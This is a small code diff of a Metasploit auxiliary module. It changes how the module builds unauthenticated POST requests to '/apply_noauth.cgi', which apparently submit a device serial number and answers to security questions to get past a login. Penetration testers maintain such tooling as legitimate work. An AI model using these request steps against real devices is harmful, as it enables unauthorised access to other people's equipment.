@@ -98,7 +98,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # 1: send serial number
     send_request_cgi({
-      'uri'     => '/apply_noauth.cgi?/unauth.cgi',
+      'uri'     => '/apply_noauth.cgi',
+      'query'   => '/unauth.cgi',
       'method'  => 'POST',
       'Content-Type' => 'application/x-www-form-urlencoded',
       'vars_post' =>
@@ -111,7 +112,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # 2: send answer to secret questions
     send_request_cgi({
-      'uri'     => '/apply_noauth.cgi?/securityquestions.cgi',
+      'uri'     => '/apply_noauth.cgi',
+      'query'   => '/securityquestions.cgi',
       'method'  => 'POST',
       'Content-Type' => 'application/x-www-form-urlencoded',
       'vars_post' =>
